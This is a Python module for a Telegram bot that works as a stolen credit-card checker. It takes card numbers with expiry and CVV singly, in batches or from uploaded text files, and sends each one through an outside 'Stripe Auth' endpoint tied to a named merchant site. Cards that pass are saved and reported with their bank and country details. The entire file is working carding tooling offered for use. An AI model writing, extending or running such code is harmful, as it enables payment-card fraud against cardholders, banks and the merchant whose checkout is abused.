# st_commands.py

from telethon import events, Button
import asyncio
import aiohttp
import json
import time
import os
import re

# --- Globals ---
client = None
utils = {}
ACTIVE_MSTXT_PROCESSES = {}
# --- New API URL ---
API_URL = "https://kamalxd.com/shopify/st7.php?site=dominileather.com&cc={card}"

# --- Core API Function (Rewritten for New API) ---
async def check_st_api(card):
    """Makes a request to the new Stripe Auth API."""
    try:
        url = API_URL.format(card=card)
        timeout = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"status": "Error", "message": f"API HTTP Error {res.status}"}
                
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    status = data.get("status", "Unknown")
                    message = data.get("message", "No response message from API.")
                    
                    # Handle 3D Secure as a decline
                    if status == "3D":
                        status = "Declined"
                        message = "3D Secure authentication required"

                    return {"status": status, "message": message}

                except json.JSONDecodeError:
                    error_snippet = response_text.strip().replace('\n', ' ')[:100]
                    return {"status": "Error", "message": f"Invalid Response: {error_snippet}"}

    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Request Timed Out"}
    except Exception as e:
        return {"status": "Error", "message": str(e)}

# --- Single Check (/st) ---
async def process_st_card(event):
    """Processes a single card check for /st command."""
    card = utils['extract_card'](event.raw_text)
    if not card and event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = utils['extract_card'](replied_msg.text)
    
    if not card:
        return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /𝙨𝙩 4111...|12|25|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    res = await check_st_api(card)
    elapsed_time = round(time.time() - start_time, 2)
    
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status")
    if status == "Approved":
        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        await utils['save_approved_card'](card, "APPROVED (ST)", res.get('message'), "Stripe Auth", "N/A")
    elif status == "Declined":
        status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
    else: # Handles "Error" and "Unknown"
        status_header = "𝙀𝙍𝙍𝙊𝙍 ⚠️"

    msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"""
    
    await loading_msg.delete()
    await event.reply(msg)

# --- Mass Check (/mst) with Batch Processing ---
async def process_mst_cards(event, cards):
    """Processes multiple cards for /mst command using concurrent batches."""
    sent_msg = await event.reply(f"```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
    
    batch_size = 10 # Process 10 cards at a time
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = [check_st_api(card) for card in batch]
        results = await asyncio.gather(*tasks)

        for card, res in zip(batch, results):
            status = res.get("status")
            
            if status == "Approved":
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                await utils['save_approved_card'](card, "APPROVED (ST)", res.get('message'), "Stripe Auth", "N/A")
            elif status == "Declined":
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            else:
                status_header = "𝙀𝙍𝙍𝙊𝙍 ⚠️"
            
            brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])

            card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"""
            
            await event.reply(card_msg)
            await asyncio.sleep(0.1) # Small delay to avoid flooding
        
    await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")

# --- Mass Text File Check (/mstxt) ---
async def process_mstxt_cards(event, cards):
    """Processes cards from a text file for /mstxt command."""
    user_id = event.sender_id
    total = len(cards)
    checked, approved, declined = 0, 0, 0
    status_msg = await event.reply("```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    
    try:
        batch_size = 15
        for i in range(0, len(cards), batch_size):
            if user_id not in ACTIVE_MSTXT_PROCESSES: break
            
            batch = cards[i:i+batch_size]
            tasks = [check_st_api(card) for card in batch]
            results = await asyncio.gather(*tasks)

            for card, res in zip(batch, results):
                if user_id not in ACTIVE_MSTXT_PROCESSES: break
                
                checked += 1
                status = res.get("status")
                
                if status == "Approved":
                    approved += 1
                    await utils['save_approved_card'](card, "APPROVED (ST)", res.get('message'), "Stripe Auth", "N/A")
                    
                    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
                    card_msg = f"""𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"""
                    await event.reply(card_msg)

                elif status == "Declined":
                    declined += 1
                
                buttons = [
                    [Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {res.get('message', '')[:25]}...", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] ✅", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] 🔥", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_st_mstxt:{user_id}".encode())]
                ]
                try:
                    await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞ंग 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass
            await asyncio.sleep(0.5)

        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!

𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ✅ : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 🔥 : {total}
"""
        await status_msg.edit(final_caption, buttons=None)

    finally:
        ACTIVE_MSTXT_PROCESSES.pop(user_id, None)

# --- Event Handler Functions ---
async def st_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    asyncio.create_task(process_st_card(event))

async def mst_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    
    text_to_check = event.raw_text
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            text_to_check = replied_msg.text

    cards = utils['extract_all_cards'](text_to_check)
    
    if not cards:
        return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙩 5414...|01|25|123 5414...|02|26|321")
    
    limit = 20
    if len(cards) > limit:
        original_count = len(cards)
        cards = cards[:limit]
        await event.reply(f"⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {limit} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {original_count}. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {limit}.")
        
    asyncio.create_task(process_mst_cards(event, cards))

async def mstxt_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    
    user_id = event.sender_id
    if user_id in ACTIVE_MSTXT_PROCESSES:
        return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
        
    if not event.is_reply:
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙨𝙩𝙭𝙩```")
    
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document:
        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩xt 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙨𝙩𝙭𝙩```")
    
    file_path = None
    try:
        file_path = await replied_msg.download_media()
        with open(file_path, "r", encoding='utf-8', errors='ignore') as f:
            lines = f.read().splitlines()
    except Exception as e:
        return await event.reply(f"Error reading file: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

    cards = [line for line in lines if re.match(r'\d{12,16}[|\s/]*\d{1,2}[|\s/]*\d{2,4}[|\s/]*\d{3,4}', line)]
    if not cards:
        return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        
    cc_limit = utils['get_cc_limit'](access_type, user_id)
    original_count = len(cards)
    if original_count > cc_limit:
        cards = cards[:cc_limit]
        await event.reply(f"⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 𝙤𝙪𝙩 𝙤𝙛 {original_count} (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩).")
    
    ACTIVE_MSTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_mstxt_cards(event, cards))

async def stop_mstxt_callback(event):
    """Callback for the stop button in /mstxt."""
    try:
        process_user_id = int(event.pattern_match.group(1).decode())
        clicking_user_id = event.sender_id
        
        can_stop = (clicking_user_id == process_user_id) or (clicking_user_id in utils['ADMIN_ID'])
        if not can_stop:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!", alert=True)

        if process_user_id in ACTIVE_MSTXT_PROCESSES:
            ACTIVE_MSTXT_PROCESSES.pop(process_user_id)
            await event.answer("⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!", alert=True)
            try:
                await event.edit(event.message.text + "\n\n-- CHECKING STOPPED BY USER --", buttons=None)
            except: pass
        else:
            await event.answer("❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!", alert=True)
    except Exception as e:
        await event.answer(f"Error: {e}", alert=True)

# --- Registration Function ---
def register_handlers(_client, _utils):
    """Registers all the handlers and utilities from the main file."""
    global client, utils
    client = _client
    utils = _utils

    client.on(events.NewMessage(pattern=r'(?i)^[/.]st'))(st_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))(mst_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mstxt$'))(mstxt_command)
    client.on(events.CallbackQuery(pattern=rb"stop_st_mstxt:(\d+)"))(stop_mstxt_callback)
    print("✅ Successfully registered ST, MST, MSTXT commands.")